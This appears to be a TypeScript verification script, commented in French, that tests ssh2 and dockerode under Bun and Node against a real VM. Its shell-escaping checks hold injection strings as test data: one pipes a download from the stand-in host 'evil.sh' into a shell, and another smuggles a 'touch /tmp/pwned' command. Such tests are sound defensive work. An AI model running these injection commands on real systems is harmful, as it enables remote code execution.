// Vérifie que ssh2 et dockerode fonctionnent réellement sur le runtime courant.
//
// CLAUDE.md pose cette question comme un préalable de Phase 1 : Bun est acquis
// comme gestionnaire de paquets, pas comme runtime du worker. `ssh2` embarque
// des addons natifs optionnels, et `dockerode` passe ici par un canal SSH — deux
// endroits où Bun peut diverger de Node sans prévenir.
//
// Le script se lance sous les deux et on compare :
//
//   bun  run packages/ssh-executor/src/verify.ts
//   node --experimental-strip-types packages/ssh-executor/src/verify.ts
//
// Il vise une vraie VM, pas un mock. La cible par défaut est celle du spike.
import { readFileSync } from "node:fs";
import { homedir } from "node:os";
import { join } from "node:path";
import {
	connect,
	disconnect,
	dockerClient,
	exec,
	execArgv,
	quoteArg,
	type ServerCredentials,
} from "./index.ts";

const HOST = process.env.TARGET_HOST ?? "192.168.252.3";
const USER = process.env.TARGET_USER ?? "ubuntu";
const KEY = process.env.SSH_KEY ?? join(homedir(), ".ssh", "id_ed25519");

const runtime =
	typeof (globalThis as { Bun?: unknown }).Bun !== "undefined"
		? `Bun ${(globalThis as { Bun: { version: string } }).Bun.version}`
		: `Node ${process.version}`;

let pass = 0;
let fail = 0;
const ok = (m: string) => {
	pass++;
	console.log(`  [32m✓[0m ${m}`);
};
const ko = (m: string) => {
	fail++;
	console.log(`  [31m✗[0m ${m}`);
};

console.log(`\n[1mRuntime : ${runtime}[0m`);
console.log(`Cible   : ${USER}@${HOST}\n`);

// La clé ne doit jamais être journalisée, ni ici ni ailleurs.
const creds: ServerCredentials = {
	host: HOST,
	user: USER,
	privateKey: readFileSync(KEY, "utf8"),
};

// ── 1. Échappement shell (pur, testable sans réseau) ────────────────────────
{
	const nasty = `main'; curl evil.sh | sh; echo '`;
	const quoted = quoteArg(nasty);
	// Une fois échappée, la chaîne doit être un seul mot pour le shell : aucun
	// `;` ni `|` ne doit en sortir non protégé.
	const reopens =
		quoted.slice(1, -1).includes("'") && !quoted.includes(`'\\''`);
	if (quoted.startsWith("'") && quoted.endsWith("'") && !reopens) {
		ok("quoteArg neutralise une injection");
	} else {
		ko(`quoteArg laisse passer : ${quoted}`);
	}
}

let client: Awaited<ReturnType<typeof connect>> | undefined;

try {
	// ── 2. Connexion SSH ────────────────────────────────────────────────────
	client = await connect(creds);
	ok("ssh2 : connexion établie");

	// ── 3. exec + capture de sortie ─────────────────────────────────────────
	const uname = await exec(client, "uname -sr");
	if (uname.code === 0 && uname.stdout.trim()) {
		ok(`ssh2 exec : ${uname.stdout.trim()}`);
	} else {
		ko(`ssh2 exec a échoué (code ${uname.code})`);
	}

	// ── 4. Code de sortie non nul remonté correctement ──────────────────────
	const failing = await exec(client, "exit 42");
	failing.code === 42
		? ok("ssh2 exec : code de sortie propagé (42)")
		: ko(`code attendu 42, reçu ${failing.code}`);

	// ── 5. execArgv : l'argument reste un seul mot ──────────────────────────
	const injected = await execArgv(client, ["echo", "a; touch /tmp/pwned; b"]);
	const clean =
		injected.stdout.trim() === "a; touch /tmp/pwned; b" &&
		(await exec(client, "test -e /tmp/pwned")).code !== 0;
	clean
		? ok("execArgv : injection neutralisée sur un vrai shell")
		: ko(`execArgv a laissé passer : ${injected.stdout.trim()}`);

	// ── 6. Streaming ligne à ligne (base du flux SSE des logs) ──────────────
	let chunks = 0;
	await exec(client, "for i in 1 2 3; do echo ligne-$i; sleep 0.2; done", {
		onStdout: () => chunks++,
	});
	chunks > 0
		? ok(`streaming : ${chunks} fragment(s) reçus au fil de l'eau`)
		: ko("streaming : aucun fragment reçu");

	// ── 7. dockerode à travers le tunnel SSH ────────────────────────────────
	const docker = dockerClient(client);
	const version = await docker.version();
	version?.Version
		? ok(
				`dockerode via SSH : Docker ${version.Version} (API ${version.ApiVersion})`,
			)
		: ko("dockerode : réponse de version vide");

	// ── 8. Lecture d'état structurée — ce pour quoi dockerode existe ────────
	// La Phase 0 a montré que `docker service update` renvoie 0 après un
	// rollback. L'état réel n'est lisible que dans UpdateStatus.
	const services = await docker.listServices();
	ok(`dockerode : ${services.length} service(s) listé(s)`);

	const spike = services.find((s) => s.Spec?.Name === "spike-app");
	if (spike) {
		const state = (spike as { UpdateStatus?: { State?: string } }).UpdateStatus
			?.State;
		ok(
			`dockerode : UpdateStatus.State = ${state ?? "(aucun)"} — lisible sans parser du texte`,
		);
	}
} catch (err) {
	ko(`exception : ${err instanceof Error ? err.message : String(err)}`);
	if (err instanceof Error && err.stack)
		console.log(err.stack.split("\n").slice(1, 4).join("\n"));
} finally {
	if (client) disconnect(client);
}

console.log(`\n[1m${runtime} — réussis ${pass}, échoués ${fail}[0m\n`);
process.exit(fail === 0 ? 0 : 1);
